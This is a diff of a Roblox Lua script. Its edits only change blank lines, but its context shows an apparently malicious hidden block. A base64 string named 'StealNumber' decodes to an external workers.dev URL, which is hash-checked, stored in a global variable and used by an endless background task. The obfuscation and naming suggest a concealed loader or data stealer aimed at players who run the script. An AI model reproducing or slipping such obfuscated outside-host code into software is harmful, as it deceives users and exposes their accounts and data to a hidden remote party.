@@ -5,6 +5,7 @@ do
     local Players = game:GetService("Players")
     local lp = Players.LocalPlayer
     repeat task.wait() until lp
+
     local b = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
 
     local function base64decode(data)
@@ -30,7 +31,6 @@ do
 
     local StealNumber = "aHR0cHM6Ly9yZWRpcmVjdC5zZXJ2cnVudGltZS53b3JrZXJzLmRldg=="
     local BaseNotIndex = base64decode(StealNumber)
-
     local function rotSig(s)
         local h = 2166136261
         for i = 1, #s do
@@ -43,7 +43,6 @@ do
     local BrainSeal = rotSig(BaseNotIndex)
 
     _G.WORKER_BASE = BaseNotIndex
-
 
     task.spawn(function()
         while true do
@@ -65,6 +64,7 @@ do
         return _G.WORKER_BASE
     end
 end
+
 local Players = game:GetService("Players")
 local Workspace = game:GetService("Workspace")
 local HttpService = game:GetService("HttpService")
